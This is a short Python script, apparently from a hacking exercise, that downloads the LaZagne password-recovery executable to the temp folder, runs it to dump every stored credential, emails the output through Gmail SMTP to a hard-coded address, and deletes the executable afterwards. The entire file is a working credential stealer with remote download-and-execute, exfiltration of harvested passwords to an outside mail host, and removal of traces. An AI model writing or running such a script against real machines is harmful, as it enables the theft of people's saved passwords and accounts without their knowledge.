#downloads laZagne.exe, executes and reports the output, deletes the .exe

import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file: #w to tell write and b for binary file
		out_file.write(get_response.content)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()


temp_directory= tempfile.gettempdir()
os.chdir(temp_directory)

download("DIRECT DOWNLOAD LINK TO LAZAGNE.EXE")

result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("jaguarhackerist@gmail.com", "#VISIT execution_report.py FOR DETAILS", result)

os.remove("laZagne.exe")